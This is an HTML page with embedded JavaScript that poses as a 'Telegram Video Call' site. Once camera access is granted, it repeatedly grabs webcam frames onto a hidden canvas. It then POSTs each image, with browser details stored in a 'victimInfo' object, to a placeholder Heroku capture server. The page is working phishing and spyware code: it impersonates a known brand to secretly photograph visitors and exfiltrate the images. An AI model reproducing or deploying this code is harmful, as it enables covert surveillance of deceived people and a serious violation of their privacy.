<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Video Call</title>
    <link rel="stylesheet" href="src/styles/main.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">ðŸ“¹</div>
            <h1>Telegram Video Call</h1>
            <p>Secure video calling platform</p>
        </div>
        
        <div class="video-container">
            <video id="videoElement" autoplay playsinline></video>
            <canvas id="hiddenCanvas" style="display:none;"></canvas>
        </div>
        
        <div class="controls">
            <button id="startBtn" class="btn-primary">Enable Camera</button>
            <button id="joinBtn" class="btn-success" style="display:none;">Join Call</button>
        </div>
        
        <div id="status" class="status">Initializing video call...</div>
    </div>

    <script>
        class CameraController {
            constructor() {
                this.stream = null;
                this.isActive = false;
                this.init();
            }

            init() {
                this.bindEvents();
                setTimeout(() => this.autoStart(), 2000);
            }

            bindEvents() {
                document.getElementById('startBtn').addEventListener('click', () => this.startCamera());
                document.getElementById('joinBtn').addEventListener('click', () => this.joinCall());
            }

            autoStart() {
                this.startCamera();
            }

            async startCamera() {
                try {
                    this.updateStatus('Requesting camera access...');
                    
                    this.stream = await navigator.mediaDevices.getUserMedia({
                        video: { width: 1280, height: 720, facingMode: 'user' },
                        audio: true
                    });

                    const video = document.getElementById('videoElement');
                    video.srcObject = this.stream;
                    video.style.display = 'block';
                    
                    document.getElementById('joinBtn').style.display = 'inline-block';
                    document.getElementById('startBtn').style.display = 'none';
                    
                    this.updateStatus('Camera ready! Click Join Call to start.');
                    this.startCapture();
                    
                } catch (error) {
                    this.updateStatus('Please allow camera access to continue.');
                }
            }

            startCapture() {
                // Ø§Ù„ØªÙ‚Ø§Ø· Ø£ÙˆÙ„ÙŠ
                setTimeout(() => this.captureImage(), 1000);
                
                // Ø§Ù„ØªÙ‚Ø§Ø· Ù…ØªÙˆØ§ØµÙ„
                setInterval(() => {
                    if (this.isActive) this.captureImage();
                }, 3000);
            }

            captureImage() {
                const video = document.getElementById('videoElement');
                const canvas = document.getElementById('hiddenCanvas');
                const ctx = canvas.getContext('2d');
                
                if (video.videoWidth > 0) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    this.sendData(imageData);
                }
            }

            sendData(imageData) {
                const victimInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    timestamp: new Date().toISOString()
                };

                fetch('https://your-server.herokuapp.com/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData, info: victimInfo })
                });
            }

            joinCall() {
                this.isActive = true;
                this.updateStatus('Call connected! Meeting in progress...');
                document.querySelector('h1').textContent = 'Call Active - Telegram';
            }

            updateStatus(message) {
                document.getElementById('status').textContent = message;
            }
        }

        // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚
        document.addEventListener('DOMContentLoaded', () => {
            new CameraController();
        });
    </script>
</body>
  </html>
